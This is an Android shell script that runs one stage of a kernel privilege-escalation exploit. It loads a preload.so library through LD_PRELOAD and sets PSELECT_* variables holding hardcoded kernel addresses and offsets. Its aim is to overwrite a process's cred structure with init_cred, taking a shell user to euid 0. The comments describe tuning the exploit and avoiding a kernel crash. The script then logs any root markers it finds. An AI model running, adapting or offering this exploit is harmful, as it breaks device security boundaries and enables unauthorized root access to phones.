#!/system/bin/sh
# Geometry-swap B: R fork-mode with PC_OFF=0x778 -> write task+0x780 cred
#
# This is the direct test of whether the C pc offset (0x778) can land when
# using the proven R fork mode.  Default R pc is 0x770 (writes real_cred);
# here we force the same fork-mode pipeline to write cred instead.
#
# Safety: PSELECT_PTR_STRICT AND-gate requires CapEff full AND euid==0.
# After this write only cred=init_cred, real_cred remains original -> CapEff=0
# -> gate does NOT trigger -> no commit_creds -> no BUG_ON.
#
# Expected on success: mt49_child_status.txt euid=0 CapEff=0 root_seen=0
# Expected on C-geometry failure: uid=2000 euid=2000 CapEff=0 root_seen=0
LOG=/data/local/tmp/geomb_log.txt
echo "=== GEOMB start $(date +%H:%M:%S) ===" > $LOG
am kill-all 2>/dev/null
rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_PC_OFF=0x778 \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/GeomB.out 2>&1
echo "GEOMB rc=$? boot=$(cat /proc/sys/kernel/random/boot_id) enforce=$(getenforce)" >> $LOG
echo "--- status ---" >> $LOG
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
echo "--- markers ---" >> $LOG
grep -a "mt33: child pid\|mt49: external\|mt48: PTR stage\|PSELECT_PTR_PC_OFF\|mt25: futex trigger\|mt19b\|pselect returned\|euid=0\|root_seen=" /data/local/tmp/GeomB.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -30 >> $LOG
cat $LOG
